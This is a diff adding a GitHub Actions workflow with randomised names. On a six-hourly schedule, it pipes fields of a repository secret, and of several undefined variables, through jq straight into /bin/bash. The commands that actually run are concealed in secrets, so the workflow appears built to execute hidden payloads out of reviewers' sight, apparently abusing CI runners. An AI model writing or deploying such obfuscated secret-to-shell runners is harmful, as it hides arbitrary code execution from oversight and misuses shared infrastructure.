@@ -1,0 +1,27 @@
+name: zhonghutu1056
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhonghutu1056
+        env:
+          fx5: ${{ secrets.fx5 }}
+        run: |
+          echo $fx5 | jq -r .najp5 | /bin/bash
+          echo $eauz0015 | jq -r .s0 | /bin/bash
+          echo $z9 | jq -r .ew8 | /bin/bash
+          echo $ml6740 | jq -r .w8745 | /bin/bash
+          echo $scy537 | jq -r .hcc267 | /bin/bash
+          echo $sndb674 | jq -r .rjki9469 | /bin/bash
+          echo $wsv7 | jq -r .spup366 | /bin/bash
+          echo $mwooq9 | jq -r .d30 | /bin/bash
+          echo $xdcc424 | jq -r .rhk1559 | /bin/bash
+          echo $hzjt2 | jq -r .mmven461 | /bin/bash
+          echo $wyrn3776 | jq -r .ep73405 | /bin/bash
+
